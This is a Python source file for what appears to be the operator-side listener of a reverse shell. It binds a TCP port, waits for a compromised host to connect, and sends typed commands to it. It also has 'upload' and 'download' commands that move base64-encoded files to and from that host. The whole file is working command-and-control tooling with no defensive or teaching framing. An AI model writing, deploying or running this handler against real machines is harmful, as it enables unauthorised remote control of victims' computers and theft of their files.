from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM, SOL_SOCKET, SO_REUSEADDR, gethostname, gethostbyname, gethostbyname_ex
from json import dumps, loads
from typing import NamedTuple
from argparse import ArgumentParser, ArgumentError
from base64 import b64decode, b64encode


class Options(NamedTuple):
    '''
    Tuple for storing configuration constants.
    '''
    ip: str
    port: int
    verbose: bool


class Listener(object):
    ip: str
    port: int

    def __init__(self, ip, port):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.ip = ip
        self.port = port

    def send(self, data):
        json_data = dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return loads(json_data)
            except ValueError:
                continue
    
    def execute(self, cmd):
        self.send(cmd)
        if cmd[0] == 'exit':
            self.connection.close()
            exit()
        return self.receive()

    def write(self, path, content):
        with open(path, 'wb') as out_file:
            out_file.write(b64decode(content))
            return '[+] Download Succesful'

    def read(self, path):
        with open(path, 'rb') as in_file:
            return b64encode(in_file.read())

    def run(self):
        self.sock.bind((self.ip, self.port))
        self.sock.listen(0)
        self.connection, self.address = self.sock.accept()
        while True:
            client_addr, client_port = self.connection.getpeername()
            cmd = input(f'{client_addr} >> ')
            cmd = cmd.split(' ')
            try:
                if cmd[0] == 'upload':
                    content = self.read(cmd[1])
                    cmd.append(content.decode())
                elif cmd[0] == 'cd' and len(cmd) > 2:
                    cmd[1] = ' '.join(cmd[1:])
                result = self.execute(cmd)
                if cmd[0] == 'download' and '[-] Error' not in result:
                    result = self.write(cmd[1], result)
            except Exception as e:
                result = f'[-] Error during command execution: \n\t{e}'
            print(result)


def get_args() -> 'Options':
    '''
    Parses command arguments for initialization of config options.
    '''
    parser = ArgumentParser()
    try:
        parser.add_argument('-p', '--port', dest='port', help='Port to bind listener to. Will default to 7777 if no port is provided.')
        parser.add_argument('-a', '--addr', dest='ip', help='IP address to bind listener to. Will default to local ip if no address is provided.')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
        options = parser.parse_args()
        if not options.verbose:
            options.verbose = False
        if not options.port:
            options.port = 7777
        if not options.ip:
            options.ip = get_local_ip()
        return Options(options.ip, int(options.port), options.verbose)
    except ArgumentError as e:
        error('An error occurred while parsing input arguments.')
        return


def get_local_ip() -> str:
    '''
    Returns the current ip of the local host
    '''
    ip = [l for l in ([ip for ip in gethostbyname_ex(gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('1.1.1.1', 53)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1]]) if l][0][0]
    return str(ip)


def error(msg: str) -> None:
    '''
    Prints an error message to standard output before exiting
    '''
    print(f'[-] {msg} Exiting...')
    exit()


def main(*args, **kwargs) -> None:
    global config
    config = get_args()
    print('[+] Starting listener')
    listener = Listener(config.ip, config.port)
    listener.run()


if __name__ == "__main__": 
    main()